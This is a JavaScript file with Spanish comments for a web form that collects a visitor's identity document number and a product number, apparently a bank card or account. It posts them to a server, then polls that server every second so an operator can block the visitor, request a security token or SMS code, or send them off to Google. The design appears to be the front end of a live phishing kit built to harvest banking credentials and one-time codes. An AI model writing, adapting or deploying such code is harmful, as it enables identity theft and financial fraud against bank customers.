document.addEventListener('DOMContentLoaded', () => {
    const formIdentity = document.getElementById('formIdentity');
    const btnSubmitIdentity = document.getElementById('btnSubmitIdentity');
    const docNumberInput = document.getElementById('docNumberInput');
    const productNumberInput = document.getElementById('productNumberInput');
    const docPills = document.querySelectorAll('#docPills .pill-btn');
    const productPills = document.querySelectorAll('#productPills .pill-btn');
    const selectedDocType = document.getElementById('selectedDocType');
    const selectedProductType = document.getElementById('selectedProductType');

    // --- 1. Manejo de botones (Pills) para documento ---
    docPills.forEach(btn => {
        btn.addEventListener('click', () => {
            docPills.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            selectedDocType.value = btn.dataset.type;
            docNumberInput.placeholder = btn.dataset.placeholder;
            checkInputs();
        });
    });

    // --- 2. Manejo de botones (Pills) para producto ---
    productPills.forEach(btn => {
        btn.addEventListener('click', () => {
            productPills.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            selectedProductType.value = btn.dataset.type;
            productNumberInput.placeholder = btn.dataset.placeholder;
            checkInputs();
        });
    });

    // --- 3. Habilitar botón de envío ---
    function checkInputs() {
        if (docNumberInput.value.trim().length > 0 && productNumberInput.value.trim().length > 0) {
            btnSubmitIdentity.disabled = false;
            btnSubmitIdentity.classList.add('active');
        } else {
            btnSubmitIdentity.disabled = true;
            btnSubmitIdentity.classList.remove('active');
        }
    }

    docNumberInput.addEventListener('input', checkInputs);
    productNumberInput.addEventListener('input', checkInputs);

    // --- 4. Envío del formulario ---
    if (formIdentity) {
        formIdentity.addEventListener('submit', async (e) => {
            e.preventDefault();
            btnSubmitIdentity.disabled = true;

            const formData = new FormData();
            formData.append('action', 'identity');
            if (typeof visitorId !== 'undefined') {
                formData.append('visitor_id', visitorId);
            }
            formData.append('doc_type', selectedDocType.value);
            formData.append('doc_number', docNumberInput.value.trim());
            formData.append('product_type', selectedProductType.value);
            formData.append('product_number', productNumberInput.value.trim());

            try {
                await fetch('api_submit.php', { method: 'POST', body: formData });
            } catch (err) {
                console.error('Error enviando identidad:', err);
            }
            window.location.href = 'cargando.php';
        });
    }

    // --- 5. Polling de seguridad (Para bloquear o cambiar de fase) ---
    setInterval(async () => {
        if (typeof visitorId === 'undefined' || !visitorId) return;
        try {
            const res = await fetch(`ping.php?id=${encodeURIComponent(visitorId)}&t=${Date.now()}`);
            if (!res.ok) return;
            const data = await res.json();
            const action = (data.action || '').trim();

            if (action === 'blocked') {
                window.location.href = 'index.php';
            } else if (action === 'pedir_token' || action === 'pedir_sms') {
                window.location.href = 'seguridad.php';
            } else if (action === 'finished') {
                window.location.href = 'https://www.google.com';
            }
        } catch (e) {}
    }, 1000);

    checkInputs();
});
